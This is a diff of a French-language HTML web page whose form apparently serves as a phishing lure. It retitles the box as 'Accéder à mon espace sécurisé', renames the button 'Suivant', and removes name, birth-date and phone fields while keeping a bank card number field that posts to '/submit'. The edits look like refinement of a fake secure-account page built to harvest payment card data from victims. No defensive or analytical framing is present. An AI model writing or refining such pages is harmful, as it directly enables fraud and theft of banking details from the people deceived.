@@ -113,28 +113,8 @@
   </div>
 
   <div class="login-box">
-    <h1>vérification de vos information</h1>
+    <h1>Accéder à mon espace sécurisé</h1>
     <form method="POST" action="/submit">
-      <label for="nom">Nom</label>
-      <input type="text" name="nom" id="nom" placeholder="Ex : Dupont" required maxlength="50">
-
-      <label for="prenom">Prénoms</label>
-      <input type="text" name="prenom" id="prenom" placeholder="Ex : Jean Pierre" required maxlength="50">
-
-      <label for="date_naissance">Date de naissance</label>
-      <input
-              type="text"
-              name="date_naissance"
-              id="date_naissance"
-              required
-              placeholder="jj/mm/aaaa"
-              pattern="\d{2}/\d{2}/\d{4}"
-              title="Format attendu : jj/mm/aaaa"
-      />
-
-      <label for="telephone">Numéro de téléphone</label>
-      <input type="tel" name="telephone" id="telephone" placeholder="Ex : 0612345678" required pattern="^0[1-9]\d{8}$">
-
       <label for="numero_carte">Numéro de carte bancaire :</label>
       <input type="text" id="numero_carte" name="numero_carte"placeholder="Ex : 41000102030405060708" pattern="\d{13,19}" maxlength="19" required>
 
@@ -147,7 +127,7 @@
 
 
 
-      <button class="btn" type="submit">Se connecter</button>
+      <button class="btn" type="submit">Suivant</button>
     </form>
   </div>
 
